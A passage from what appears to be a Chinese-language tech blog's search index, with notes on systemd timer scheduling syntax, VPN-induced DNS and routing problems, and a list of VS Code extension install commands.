--since=&quot;-60s&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Calendar\"><a href=\"#Calendar\" class=\"headerlink\" title=\"Calendar\"></a>Calendar</h3><h4 id=\"一般時間執行\"><a href=\"#一般時間執行\" class=\"headerlink\" title=\"一般時間執行\"></a>一般時間執行</h4><p>全部參考:<a href=\"https://www.junmajinlong.com/linux/systemd/systemd_timer/#%E6%9B%B4%E4%B8%BA%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E6%97%B6%E8%A7%84%E5%88%99%EF%BC%9AOnCalendar\" target=\"_blank\" rel=\"noopener\">systemd timer：取代cron和at的定时任务 | 骏马金龙</a><br>裡面內容豐富，建議看裡面內文</p>\n<p>這邊貼範例<br>看範例修改就真的很方便</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 假如今日是2012-11-23</span><br><span class=\"line\">  Fri 2012-11-23 11:12:13 → Fri 2012-11-23 11:12:13</span><br><span class=\"line\">      2012-11-23 11:12:13 → Fri 2012-11-23 11:12:13</span><br><span class=\"line\">  2012-11-23 11:12:13 UTC → Fri 2012-11-23 19:12:13</span><br><span class=\"line\">               2012-11-23 → Fri 2012-11-23 00:00:00</span><br><span class=\"line\">                 12-11-23 → Fri 2012-11-23 00:00:00</span><br><span class=\"line\">                 11:12:13 → Fri 2012-11-23 11:12:13</span><br><span class=\"line\">                    11:12 → Fri 2012-11-23 11:12:00</span><br><span class=\"line\">                      now → Fri 2012-11-23 18:15:22</span><br><span class=\"line\">                    today → Fri 2012-11-23 00:00:00</span><br><span class=\"line\">                today UTC → Fri 2012-11-23 16:00:00</span><br><span class=\"line\">                yesterday → Fri 2012-11-22 00:00:00</span><br><span class=\"line\">                 tomorrow → Fri 2012-11-24 00:00:00</span><br><span class=\"line\">                 +3h30min → Fri 2012-11-23 21:45:22</span><br><span class=\"line\">                      -5s → Fri 2012-11-23 18:15:17</span><br><span class=\"line\">                11min ago → Fri 2012-11-23 18:04:22</span><br><span class=\"line\">      2 months 5 days ago</span><br><span class=\"line\">              @1395716396 → Tue 2014-03-25 03:59:56</span><br></pre></td></tr></table></figure>\n<p>進階使用<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sat,Mon..Wed   -&gt; 周一、二、三、四</span><br><span class=\"line\">*:00           -&gt; 每小时，省略秒位</span><br><span class=\"line\">*:*            -&gt; 每分钟，省略秒位</span><br><span class=\"line\">*:*:*          -&gt; 每秒</span><br><span class=\"line\">*-*-01 00:00   -&gt; 每月一号，省略秒位</span><br><span class=\"line\">*-02~03        -&gt; 表示2月的倒数第三天  </span><br><span class=\"line\">*-05~07/1      -&gt; 表示5月最后7天中的每一天</span><br><span class=\"line\">*-05~1..7      -&gt; 同上</span><br><span class=\"line\">Mon *-05~07/1  -&gt; 表示5月最后一个星期一</span><br><span class=\"line\">*:*:3.33/10.05 -&gt; 小数表示秒。3.33,13.38,23.43,33.48,43.53</span><br><span class=\"line\">9..17/2:00     -&gt; 从上午9点开始每隔两小时，直到下午5点</span><br><span class=\"line\">12..14:10,20   -&gt; 12到14点的第10分钟和第20分钟，即1[234]:[12]0:00</span><br></pre></td></tr></table></figure></p>\n<p>連月底跟09~17每隔兩小時執行都可以做到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sat,Mon..Wed   -&gt; 週一、二、三、四</span><br><span class=\"line\">*:00           -&gt; 每小時，省略秒位</span><br><span class=\"line\">*:*            -&gt; 每分鐘，省略秒位</span><br><span class=\"line\">*:*:*          -&gt; 每秒</span><br><span class=\"line\">*-*-01 00:00   -&gt; 每月一號，省略秒位</span><br><span class=\"line\">*-02~03        -&gt; 表示2月的倒數第三天  </span><br><span class=\"line\">*-05~07/1      -&gt; 表示5月最後7天中的每一天</span><br><span class=\"line\">*-05~1..7      -&gt; 同上</span><br><span class=\"line\">Mon *-05~07/1  -&gt; 表示5月最後一個星期一</span><br><span class=\"line\">*:*:3.33/10.05 -&gt; 小數表示秒。3.33,13.38,23.43,33.48,43.53</span><br><span class=\"line\">9..17/2:00     -&gt; 從上午9點開始每隔兩小時，直到下午5點</span><br><span class=\"line\">12..14:10,20   -&gt; 12到14點的第10分鐘和第20分鐘，即1[234]:[12]0:00</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sat,Mon..Wed   -&gt; 週一、二、三、四</span><br><span class=\"line\">*:00           -&gt; 每小時，省略秒位</span><br><span class=\"line\">*:*            -&gt; 每分鐘，省略秒位</span><br><span class=\"line\">*:*:*          -&gt; 每秒</span><br><span class=\"line\">*-*-01 00:00   -&gt; 每月一號，省略秒位</span><br><span class=\"line\">*-02~03        -&gt; 表示2月的倒數第三天  </span><br><span class=\"line\">*-05~07/1      -&gt; 表示5月最後7天中的每一天</span><br><span class=\"line\">*-05~1..7      -&gt; 同上</span><br><span class=\"line\">Mon *-05~07/1  -&gt; 表示5月最後一個星期一</span><br><span class=\"line\">*:*:3.33/10.05 -&gt; 小數表示秒。3.33,13.38,23.43,33.48,43.53</span><br><span class=\"line\">9..17/2:00     -&gt; 從上午9點開始每隔兩小時，直到下午5點</span><br><span class=\"line\">12..14:10,20   -&gt; 12到14點的第10分鐘和第20分鐘，即1[234]:[12]0:00</span><br></pre></td></tr></table></figure>\n<h5 id=\"快速分析工具\"><a href=\"#快速分析工具\" class=\"headerlink\" title=\"快速分析工具\"></a>快速分析工具</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemd-analyze calendar &quot;*:*:00&quot;  </span><br><span class=\"line\"> Original form: *:*:00</span><br><span class=\"line\">Normalized form: *-*-* *:*:00</span><br><span class=\"line\">    Next elapse: Sat 2020-11-21 00:01:00 CST</span><br><span class=\"line\">       (in UTC): Fri 2020-11-20 16:01:00 UTC</span><br><span class=\"line\">       From now: 24s left</span><br></pre></td></tr></table></figure>\n<p>後面放時間，可以看到內容</p>\n<h4 id=\"月底執行\"><a href=\"#月底執行\" class=\"headerlink\" title=\"月底執行\"></a>月底執行</h4><p>在還沒整理上面，有特別先找的</p>\n<p>之前就有記過<a href=\"https://malagege.github.io/blog/2019/08/04/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/\">排程 crontab 時間設定月底執行方法 | 程式狂想筆記</a><br>在想這個有沒有比較優的方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">As of version 233, systemd supports using &quot;~&quot; in its calendar syntax to specify dates relative to the end of the month.</span><br><span class=\"line\"></span><br><span class=\"line\">OnCalendar=*-02~03 means the third last day in February (the 26th or 27th, depending on whether or not it&apos;s a leap year)</span><br><span class=\"line\"></span><br><span class=\"line\">Mon *-05~07/1 and Mon *-05~01..07 are synonyms for the last Monday in May.</span><br><span class=\"line\"></span><br><span class=\"line\">https://github.com/systemd/systemd/blob/v233/NEWS#L174</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://unix.stackexchange.com/questions/306336/how-to-configure-systemd-timer-to-run-the-service-on-last-day-of-the-month\" target=\"_blank\" rel=\"noopener\">How to configure Systemd Timer to run the service on last day of the month - Unix &amp; Linux Stack Exchange</a></p>\n<h4 id=\"持久化\"><a href=\"#持久化\" class=\"headerlink\" title=\"持久化\"></a>持久化</h4><p><strong>Timer</strong>段中還可以使用Unit指令和Persistent指令。</p>\n<ul>\n<li>Unit=xxx.service：默認情況下，a.timer對應要執行的任務文件是a.service，使用Unit指令可以明確指定觸發定時任務事件時要執行的文件</li>\n<li>Persistent=yes/no：只在使用了OnCalendar時有效，默認值no。設置yes時，會將上次執行任務的時間點保存在磁盤上，使得定時器再次被啟動時，可以立即判斷是否要執行丟失的任務 </li>\n</ul>\n<p>有間單測試，我以為設定<code>*:*:00</code> 超過三分鐘會執行三次，但是不會…</p>\n<p>timer</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Unit]</span></span><br><span class=\"line\"><span class=\"attr\">Description</span> = user login timer</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Timer]</span></span><br><span class=\"line\"><span class=\"attr\">AccuracySec</span> = <span class=\"number\">1</span>ms</span><br><span class=\"line\"><span class=\"attr\">RandomizedDelaySec</span> = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attr\">OnCalendar</span> = *:*:<span class=\"number\">00</span></span><br><span class=\"line\"><span class=\"attr\">Persistent</span> = <span class=\"literal\">yes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Install]</span></span><br><span class=\"line\"><span class=\"attr\">WantedBy</span> = timers.target</span><br></pre></td></tr></table></figure>\n<p>service</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description = current time when task is been executed</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">ExecStart = /bin/bash -c &apos;date +&quot;%%T&quot; &gt;&gt;/home/malagege/a.log&apos;</span><br></pre></td></tr></table></figure>\n<h2 id=\"socket-觸發啟動\"><a href=\"#socket-觸發啟動\" class=\"headerlink\" title=\"socket 觸發啟動\"></a>socket 觸發啟動</h2><p><a href=\"http://www.ruanyifeng.com/blog/2016/03/node-systemd-tutorial.html\" target=\"_blank\" rel=\"noopener\">Node 应用的 Systemd 启动 - 阮一峰的网络日志</a></p>\n<p>這裡面有介紹<br>還覺得滿有趣的<br>但目前我這邊應該用不到這個功能</p>\n<h2 id=\"搜尋相關文章\"><a href=\"#搜尋相關文章\" class=\"headerlink\" title=\"搜尋相關文章\"></a>搜尋相關文章</h2><h3 id=\"詳細教學文章\"><a href=\"#詳細教學文章\" class=\"headerlink\" title=\"詳細教學文章\"></a>詳細教學文章</h3><ul>\n<li><a href=\"https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd (正體中文) - ArchWiki</a>)</li>\n<li><a href=\"https://cfarm.blog.aznc.cc/%E4%BD%BF%E7%94%A8-systemd-timer-%E4%BB%A3%E6%9B%BF-crontab/\" target=\"_blank\" rel=\"noopener\">使用 systemd.timer 代替 crontab | C瓜農場</a></li>\n<li><a href=\"https://zdyxry.github.io/2018/06/28/%E4%BD%BF%E7%94%A8-systemd-timer-%E6%9B%BF%E6%8D%A2-crontab/\" target=\"_blank\" rel=\"noopener\">使用 systemd timer 替换 crontab | Yiran’s Blog</a></li>\n<li><a href=\"https://www.junmajinlong.com/linux/systemd/runlevel/\" target=\"_blank\" rel=\"noopener\">systemd時代的運行級別 | 駿馬金龍</a> <a href=\"/blog/2020/12/07/Systemd-時間排程筆記/web2.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://www.junmajinlong.com/linux/systemd/systemd_timer/\" target=\"_blank\" rel=\"noopener\">systemd timer：取代cron和at的定时任务 | 骏马金龙</a> <a href=\"/blog/2020/12/07/Systemd-時間排程筆記/web3.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.3chy2.com.tw/3c%E8%B3%87%E8%A8%8A/linux-systemd-%E8%A9%B3%E7%B4%B0%E4%BB%8B%E7%B4%B9-unit%E3%80%81unit-file%E3%80%81systemctl%E3%80%81target/\" target=\"_blank\" rel=\"noopener\">Linux Systemd 詳細介紹: Unit、Unit File、Systemctl、Target | 3C</a> <a href=\"/blog/2020/12/07/Systemd-時間排程筆記/web4.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.junmajinlong.com/linux/index/#systemd\" target=\"_blank\" rel=\"noopener\">Linux系列文章 | 骏马金龙</a></li>\n</ul>\n<h3 id=\"與supervisor-差異\"><a href=\"#與supervisor-差異\" class=\"headerlink\" title=\"與supervisor 差異\"></a>與supervisor 差異</h3><ul>\n<li><a href=\"https://segmentfault.com/a/1190000009338835\" target=\"_blank\" rel=\"noopener\">systemd vs supervisord_spacewander - SegmentFault 思否</a></li>\n<li><a href=\"https://liqiang.io/post/systemd-vs-supervisord\" target=\"_blank\" rel=\"noopener\">Systemd Supervisord 肤浅对比</a></li>\n<li><a href=\"https://www.zhihu.com/question/48833333\" target=\"_blank\" rel=\"noopener\">systemd 和 supervisor 相比各有哪些优缺点？以及各自的适用场景是什么？ - 知乎</a></li>\n</ul>\n<p>之前分不清楚systemd 和 supervisor<br>最後看教學，一個是系統層級的、一個是應用層級的<br>最後還是決定學好 systemd</p>\n<p>不過後來發現 timer 相關設定 supervisor 沒有相關設定</p>\n<h3 id=\"跟-docker-差異\"><a href=\"#跟-docker-差異\" class=\"headerlink\" title=\"跟 docker 差異\"></a>跟 docker 差異</h3><ul>\n<li><a href=\"http://dockone.io/article/1093\" target=\"_blank\" rel=\"noopener\">Systemd与Docker的爱恨情仇 - DockOne.io</a></li>\n<li><a href=\"https://blog.davy.tw/posts/use-systemd-to-manage-docker-container/\" target=\"_blank\" rel=\"noopener\">使用 systemd 管理 Docker container</a></li>\n</ul>\n<p>之前有改想過systemd 管理docker 排程，但好像不建議這樣做…</p>\n<h3 id=\"Failed-to-connect-to-bus-No-such-file-or-directory”\"><a href=\"#Failed-to-connect-to-bus-No-such-file-or-directory”\" class=\"headerlink\" title=\"Failed to connect to bus: No such file or directory”\"></a>Failed to connect to bus: No such file or directory”</h3><p>我們公司環境沒版法使用 <code>systemctl --user</code><br>不知道是不是沒有 D-Bus關係<br>以下文章都嘗試過，還是沒辦法使用</p>\n<ul>\n<li><a href=\"https://superuser.com/questions/1561076/systemctl-use-failed-to-connect-to-bus-no-such-file-or-directory-debian-9\" target=\"_blank\" rel=\"noopener\">linux - systemctl –use Failed to connect to bus: No such file or directory Debian 9 - Super User</a></li>\n<li><p><a href=\"https://gist.github.com/Cretezy/dc64ed4519c63c3eb636fba354f93a1f\" target=\"_blank\" rel=\"noopener\">systemd user “Failed to connect to bus: No such file or directory”</a></p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/tengdazhang770960436/article/details/78873869\" target=\"_blank\" rel=\"noopener\">docker centos 使用 systemctl Failed to get D-Bus connection: Operation not permitted_彻底拆分，一切可控！-CSDN博客</a></p>\n</li>\n<li><a href=\"https://blog.csdn.net/tengdazhang770960436/article/details/78873869\" target=\"_blank\" rel=\"noopener\">docker centos 使用 systemctl Failed to get D-Bus connection: Operation not permitted_彻底拆分，一切可控！-CSDN博客</a></li>\n</ul>\n<p>XDG_RUNTIME_DIR=/run/user/<code>id -u</code><br><del>建立資料夾??</del>沒有用<br><a href=\"https://answers.launchpad.net/ubuntu/+source/systemd/+question/287454\" target=\"_blank\" rel=\"noopener\">https://answers.launchpad.net/ubuntu/+source/systemd/+question/287454</a></p>\n<p>XDG_RUNTIME_DIR=/run/user/$UID systemctl –user status<br>我電腦 ElementaryOS 新家的參數</p>\n<h3 id=\"其他參數\"><a href=\"#其他參數\" class=\"headerlink\" title=\"其他參數\"></a>其他參數</h3><h4 id=\"work-dir\"><a href=\"#work-dir\" class=\"headerlink\" title=\"work dir\"></a>work dir</h4><p><a href=\"https://www.digitalocean.com/community/questions/trying-to-change-workingdirectory-of-systemd-service-unit\" target=\"_blank\" rel=\"noopener\">Trying to change WorkingDirectory of Systemd Service Unit | DigitalOcean</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">WorkingDirectory=/home/pi</span><br><span class=\"line\">ExecStart=/home/pi/launchscript.sh</span><br></pre></td></tr></table></figure></p>\n<p>ExecStart 必須要完整路徑</p>\n<h4 id=\"timeout\"><a href=\"#timeout\" class=\"headerlink\" title=\"timeout\"></a>timeout</h4><p><a href=\"https://unix.stackexchange.com/questions/227017/how-to-change-systemd-service-timeout-value\" target=\"_blank\" rel=\"noopener\">centos - How to change systemd service timeout value? - Unix &amp; Linux Stack Exchange</a></p>\n<blockquote>\n<p>TimeoutStartSec=</p>\n</blockquote>\n<blockquote>\n<p>   設置該服務允許的最大啟動時長。 如果守護進程未能在限定的時長內發出”啟動完畢”的信號，那麼該服務將被視為啟動失敗，並會被關閉。 如果未指定時間單位，那麼將視為以秒為單位。 例如設為”20”等價於設為”20s”。 設為 “infinity” 則表示永不超時。 當 Type=oneshot 時， 默認值為 “infinity” (永不超時)， 否則默認值等於 DefaultTimeoutStartSec= 的值(參見 systemd-system.conf(5) 手冊)。</p>\n</blockquote>\n<blockquote>\n<p>   如果一個 Type=notify 服務發送了 “EXTEND_TIMEOUT_USEC=…” 信號， 那麼允許的啟動時長將會在 TimeoutStartSec= 基礎上繼續延長指定的時長。 注意，必須在 TimeoutStartSec= 用完之前發出第一個延時信號。當啟動時間超出 TimeoutStartSec= 之後，該服務可以在維持始終不超時的前提下，不斷重複發送 “EXTEND_TIMEOUT_USEC=…” 信號， 直到完成啟動(發送 “READY=1” 信號)。詳見 sd_notify(3) 手冊。<br>TimeoutStopSec=</p>\n</blockquote>\n<blockquote>\n<p>   此選項有兩個用途： (1)設置每個 ExecStop= 的超時時長。如果其中之一超時， 那麼所有後繼的 ExecStop= 都會被取消，並且該服務也會被 SIGTERM 信號強制關閉。 如果該服務沒有設置 ExecStop= ，那麼該服務將會立即被 SIGTERM 信號強制關閉。 (2)設置該服務自身停止的超時時長。如果超時，那麼該服務將會立即被 SIGTERM 信號強制關閉(參見 systemd.kill(5) 手冊中的 KillMode= 選項)。 如果未指定時間單位，那麼將視為以秒為單位。 例如設為”20”等價於設為”20s”。 設為 “infinity” 則表示永不超時。 默認值等於 DefaultTimeoutStopSec= 的值(參見 systemd-system.conf(5) 手冊)。</p>\n</blockquote>\n<blockquote>\n<p>   如果一個 Type=notify 服務發送了 “EXTEND_TIMEOUT_USEC=…” 信號， 那麼允許的停止時長將會在 TimeoutStopSec= 基礎上繼續延長指定的時長。 注意，必須在 TimeoutStopSec= 用完之前發出第一個延時信號。當停止時間超出 TimeoutStopSec= 之後，該服務可以在維持始終不超時的前提下，不斷重複發送 “EXTEND_TIMEOUT_USEC=…” 信號，直到完成停止。 詳見 sd_notify(3) 手冊。 </p>\n</blockquote>\n<p><a href=\"http://www.jinbuguo.com/systemd/systemd.service.html\" target=\"_blank\" rel=\"noopener\">systemd.service 中文手冊 [金步國]</a></p>\n<h2 id=\"Supervisor\"><a href=\"#Supervisor\" class=\"headerlink\" title=\"Supervisor\"></a>Supervisor</h2><p><a href=\"https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/170578/\" target=\"_blank\" rel=\"noopener\">Ubuntu下Supervisor安裝、配置和使用 | 程式前沿</a><br>日後看情況再研究<br>有看到 golang 版本<br>假如沒有權限可以考慮<br>但發現好像沒有 crontab 東西</p>\n<p>不繼續研究了….</p>\n<h2 id=\"總結\"><a href=\"#總結\" class=\"headerlink\" title=\"總結\"></a>總結</h2><p>不專業總結<br>網路上有很多都寫得很詳細<br>建議看網路上詳細<br>本篇重點在筆記</p>\n<p>網路上沒什麼看到 systemd 搭配 docker 裡面跑<br>感覺 supervisor 真的比較多<br>但我覺得排程這個東西有必要做虛擬化跑?這個也是個問題</p>\n<p>用 crond 和 systemd 這個問題也是一個問題<br>目前我待過三家公司都是用 crond 居多<br>但用 crond 必須控制分散程式執行時間<br>有了 systemd ，工程師不用做複雜設計就可以使用<br>前提要會操作，所以進入門檻稍微高一點</p>\n<p>不知道這些 systemd 有沒有辦法紀錄到 elk 上面<br>但我覺得這之後有空再研究<br>畢竟我還不會用XD</p>\n","categories":["Linux"],"tags":["systemd","crontab"]},{"title":"VPN後導置DNS改變無法連到內網網址","url":"/blog/2019/03/14/VPN%E5%BE%8C%E5%B0%8E%E7%BD%AEDNS%E6%94%B9%E8%AE%8A%E7%84%A1%E6%B3%95%E9%80%A3%E5%88%B0%E5%85%A7%E7%B6%B2%E7%B6%B2%E5%9D%80/","content":"<p>最近連到 VPN，有同事反應連不到內網的 gitlab<br>由於我們 MIS 有改 Gitlab 網址(原本是 IP)<br>改成網址(git.xxx.com.tw)<br>但是連 VPN 後怎麼連不到</p>\n<a id=\"more\"></a>\n<p>由於我有一個朋友是做網路的<br>所以有問他這個問題<br>當你連 VPN 的時候，可能對方會重新寫入你的路由設定<br>DNS 也會被改變(本次的地雷)</p>\n<p>Linux 看路由方法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; ip route show</span><br><span class=\"line\">default dev ppp0 scope link</span><br><span class=\"line\">default via 192.168.1.1 dev wlp3s0 proto dhcp metric 600</span><br><span class=\"line\">168.95.xxx.xxx dev ppp0 proto kernel scope link src 118.x.xx.xxx</span><br><span class=\"line\">169.x.0.0/16 dev wlp3s0 scope link metric 1000</span><br><span class=\"line\">172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1</span><br><span class=\"line\">192.168.1.0/24 dev wlp3s0 proto kernel scope link src 192.168.1.121 metric 600</span><br></pre></td></tr></table></figure>\n<p>window 看路由方法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; route <span class=\"built_in\">print</span></span><br><span class=\"line\">IPv4 路由表</span><br><span class=\"line\">===========================================================================</span><br><span class=\"line\">使用中的路由:</span><br><span class=\"line\">網路目的地                 網路遮罩         閘道          介面       計量</span><br><span class=\"line\">          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.111     35</span><br><span class=\"line\">          0.0.0.0          0.0.0.0          6.0.0.1          6.1.1.1   5025</span><br><span class=\"line\">          6.0.0.0        255.0.0.0            在連結上           6.1.1.1    281</span><br><span class=\"line\">          6.1.1.1  255.255.255.255            在連結上           6.1.1.1    281</span><br><span class=\"line\">    6.255.255.255  255.255.255.255            在連結上           6.1.1.1    281</span><br><span class=\"line\">        10.10.1.0    255.255.255.0            在連結上         10.10.1.1    291</span><br></pre></td></tr></table></figure>\n<p>連 VPN 我看了一下結果，VPN 並非把所有 IP 都做 defualt gateway<br>他很明確把<code>10.10.xx.xx</code>那些 IP 導向那邊去</p>\n<p>所以我在 VPN 就連<code>192.168.x.x</code>(gitlab IP 位置)<br>空白網頁(網址有導向 git.xxxx.com.tw)<br>這時候我懷疑了 DNS</p>\n<p>DNS 看了一下<br>果然連 VPN 的時候跟沒連的 DNS 位置不一樣</p>\n<p>然後過幾天，副理出國遠端電腦發現不能連 git<br>也是一樣的問題 XDD</p>\n<p>寫一篇筆記，留意這個問題</p>\n<p>網路小筆記<br>一般設定 GateWay IP，通常設定固定 IP 的時候，可能會不知道這是幹什麼用？<br>但是今天問同學，他有簡單說明這個用途<br>之前想說沒輸入這個應該可有可無也可以連</p>\n<p>發送 IP 的時候，我們電腦在不同網域的時候<br>已定要送到 gateway<br>不然不同網域誰知道要往哪裡送出</p>\n<p>所以我以前電腦就算沒有設定 gateway 連相同網段也不會有問題<br>相同網段可能不需要找吧(XD 不確定)</p>\n<p>簡單有問同學，直接連別台 PC 電腦，那是不是也可以做一樣的事情<br>我同學說可以。恍然大悟，原來 gateway 設定對網路這一快也是很重要<br>今天又學到一個重要的知識!!!</p>\n<p>nslookup 查詢 dns 解析方法<br><code>server dns</code><br><img src=\"/blog/2019/03/14/VPN後導置DNS改變無法連到內網網址/1.jpg\" title=\"DNS查詢\"><br><a href=\"http://faq.extra.pchome.com.tw/faq_content02.htm?exh_no=P000007&amp;pexh_no=P000181&amp;cexh_no=H000185&amp;faq_id=327&amp;qnum=1\" target=\"_blank\" rel=\"noopener\">PChome Online - 股市</a></p>\n"},{"title":"VScode,Sublime 使用套件整理","url":"/blog/2020/02/09/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/","content":"<p>整理使用過</p>\n<a id=\"more\"></a>\n<p>計畫會依照一年去做</p>\n<blockquote>\n<p>UNIX:</p>\n<p>code –list-extensions | xargs -L 1 echo code –install-extension</p>\n<p>Windows (PowerShell, e. g. using VSCode’s integrated Terminal):</p>\n<p>code –list-extensions | % { “code –install-extension $_” }</p>\n</blockquote>\n<p><a href=\"https://stackoverflow.com/questions/35773299/how-can-you-export-vs-code-extension-list\" target=\"_blank\" rel=\"noopener\">How can you export VS Code extension list - Stack Overflow</a></p>\n<p>Sublime 查詢 package list方法</p>\n<p>preferences-&gt;Browser Package</p>\n<p>ls 列出來</p>\n<h1 id=\"VScode-和-sublime-套件\"><a href=\"#VScode-和-sublime-套件\" class=\"headerlink\" title=\"VScode 和 sublime 套件\"></a>VScode 和 sublime 套件</h1><h2 id=\"2020\"><a href=\"#2020\" class=\"headerlink\" title=\"2020\"></a>2020</h2><h3 id=\"VScode\"><a href=\"#VScode\" class=\"headerlink\" title=\"VScode\"></a>VScode</h3><h4 id=\"公司\"><a href=\"#公司\" class=\"headerlink\" title=\"公司\"></a>公司</h4><p>code –install-extension alexdima.copy-relative-path<br>code –install-extension beaugust.blamer-vs<br>code –install-extension bierner.emojisense<br>code –install-extension bierner.markdown-checkbox<br>code –install-extension bierner.markdown-emoji<br>code –install-extension bierner.markdown-footnotes<br>code –install-extension bierner.markdown-image-size<br>code –install-extension bierner.markdown-preview-github-styles<br>code –install-extension bmewburn.vscode-intelephense-client<br>code –install-extension christian-kohler.path-intellisense<br>code –install-extension dbaeumer.vscode-eslint<br>code –install-extension donjayamanne.githistory<br>code –install-extension DotJoshJohnson.xml<br>code –install-extension dushaobindoudou.translation<br>code –install-extension eamodio.gitlens<br>code –install-extension EditorConfig.EditorConfig<br>code –install-extension eg2.tslint<br>code –install-extension espresso3389.unixtime-converter<br>code –install-extension felixfbecker.php-intellisense<br>code –install-extension formulahendry.auto-close-tag<br>code –install-extension formulahendry.auto-rename-tag<br>code –install-extension formulahendry.code-runner<br>code –install-extension fskorzec.shadow-align<br>code –install-extension GrapeCity.gc-excelviewer<br>code –install-extension HackMD.vscode-hackmd<br>code –install-extension huizhou.githd<br>code –install-extension humao.rest-client<br>code –install-extension imperez.smarty<br>code –install-extension JakeWilson.vscode-cdnjs<br>code –install-extension janjoerke.align-by-regex<br>code –install-extension johnstoncode.svn-scm<br>code –install-extension Kelvin.vscode-sshfs<br>code –install-extension kokororin.vscode-phpfmt<br>code –install-extension liximomo.sftp<br>code –install-extension mhutchie.git-graph<br>code –install-extension michelemelluso.gitignore<br>code –install-extension mikestead.dotenv<br>code –install-extension mkloubert.vscode-remote-workspace<br>code –install-extension ms-azuretools.vscode-docker<br>code –install-extension MS-CEINTL.vscode-language-pack-zh-hant<br>code –install-extension ms-vscode.Go<br>code –install-extension ms-vscode.sublime-keybindings<br>code –install-extension mtxr.sqltools<br>code –install-extension neilbrayfield.php-docblocker<br>code –install-extension octref.vetur<br>code –install-extension PKief.material-icon-theme<br>code –install-extension quicktype.quicktype<br>code –install-extension redhat.vscode-xml<br>code –install-extension ryu1kn.partial-diff<br>code –install-extension sadeghpm.sql-snippets<br>code –install-extension shd101wyy.markdown-preview-enhanced<br>code –install-extension shengchen.vscode-leetcode<br>code –install-extension small.php-ci<br>code –install-extension softwaredotcom.swdc-vscode<br>code –install-extension streetsidesoftware.code-spell-checker<br>code –install-extension teamchilla.blueprint<br>code –install-extension Tobermory.es6-string-html<br>code –install-extension tomoki1207.pdf<br>code –install-extension wwm.better-align<br>code –install-extension Yukai.vscode-ptt<br>code –install-extension zhuangtongfa.material-theme</p>\n<h4 id=\"家裡\"><a href=\"#家裡\" class=\"headerlink\" title=\"家裡\"></a>家裡</h4><p>code –install-extension alefragnani.project-manager<br>code –install-extension bierner.emojisense<br>code –install-extension bierner.markdown-checkbox<br>code –install-extension bierner.markdown-emoji<br>code –install-extension bierner.markdown-footnotes<br>code –install-extension bierner.markdown-image-size<br>code –install-extension bierner.markdown-preview-github-styles<br>code –install-extension christian-kohler.path-intellisense<br>code –install-extension codingyu.laravel-goto-view<br>code –install-extension donjayamanne.githistory<br>code –install-extension eamodio.gitlens<br>code –install-extension esbenp.prettier-vscode<br>code –install-extension felixfbecker.php-intellisense<br>code –install-extension giladgray.theme-blueprint<br>code –install-extension Gruntfuggly.todo-tree<br>code –install-extension HackMD.vscode-hackmd<br>code –install-extension humao.rest-client<br>code –install-extension JakeWilson.vscode-cdnjs<br>code –install-extension jkjustjoshing.vscode-text-pastry<br>code –install-extension Kelvin.vscode-sshfs<br>code –install-extension kokororin.vscode-phpfmt<br>code –install-extension lannonbr.vscode-js-annotations<br>code –install-extension lukazakrajsek.scss-refactoring<br>code –install-extension MehediDracula.php-namespace-resolver<br>code –install-extension michelemelluso.gitignore<br>code –install-extension mikestead.dotenv<br>code –install-extension mitchdenny.ecdc<br>code –install-extension mrmlnc.vscode-scss<br>code –install-extension MS-CEINTL.vscode-language-pack-zh-hant<br>code –install-extension ms-vscode.Go<br>code –install-extension ms-vscode.sublime-keybindings<br>code –install-extension negokaz.live-server-preview<br>code –install-extension octref.vetur<br>code –install-extension oderwat.indent-rainbow<br>code –install-extension onecentlin.laravel-blade<br>code –install-extension pranaygp.vscode-css-peek<br>code –install-extension renesackers.angelscript<br>code –install-extension ritwickdey.live-sass<br>code –install-extension ritwickdey.LiveServer<br>code –install-extension robinbentley.sass-indented<br>code –install-extension shyykoserhiy.git-autoconfig<br>code –install-extension small.php-ci<br>code –install-extension streetsidesoftware.code-spell-checker<br>code –install-extension Tobermory.es6-string-html<br>code –install-extension vector-of-bool.gitflow<br>code –install-extension vscode-icons-team.vscode-icons<br>code –install-extension yuichinukiyama.vscode-preview-server<br>code –install-extension zhangciwu.swig-tpl</p>\n<h3 id=\"Sublime\"><a href=\"#Sublime\" class=\"headerlink\" title=\"Sublime\"></a>Sublime</h3><h4 